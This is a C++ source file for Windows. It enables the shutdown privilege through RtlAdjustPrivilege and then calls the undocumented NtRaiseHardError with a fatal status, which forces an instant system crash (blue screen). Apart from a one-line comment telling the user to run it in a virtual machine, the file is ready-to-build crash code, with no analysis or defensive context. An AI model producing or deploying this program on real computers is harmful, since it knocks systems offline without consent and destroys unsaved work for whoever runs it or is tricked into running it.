#include <iostream>
#include <Windows.h>
#include <winternl.h>

#define SeShutdownPrivilege 19
#define STATUS_SYSTEM_PROCESS_TERMINATED ((NTSTATUS)0xC000021A)

using namespace std;

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
// Please use VM ...
int main() {
    LPVOID funcaddr = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    if (funcaddr == NULL) {
        cerr << "[-] Address Not Found!" << endl;
        cout << "[!] Error:" << GetLastError() << endl;
        getchar();
        return 1;
    }

    BOOLEAN bEnabled;
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)funcaddr;
    NTSTATUS NtStatus = RtlAdjustPrivilege(SeShutdownPrivilege, TRUE, FALSE, &bEnabled);

    if (NtStatus != 0) {
        cerr << "[-] RtlAdjustPrivilege Failed!" << endl;
        cout << "[!] NTSTATUS:" << NtStatus << endl;
        getchar();
        return 1;
    }

    LPVOID funcaddr2 = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
    if (funcaddr2 == NULL) {
        cerr << "[-] Address Not Found!" << endl;
        cout << "[!] Error:" << GetLastError() << endl;
        getchar();
        return 1;
    }

    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)funcaddr2;
    ULONG Response;
    NtStatus = NtRaiseHardError(STATUS_SYSTEM_PROCESS_TERMINATED, 0, 0, NULL, 6, &Response);

    if (NtStatus != 0) {
        cerr << "[-] NtRaiseHardError Failed!" << endl;
        cout << "[!] NTSTATUS:" << NtStatus << endl;
        getchar();
        return 1;
    }

    return 0;
}
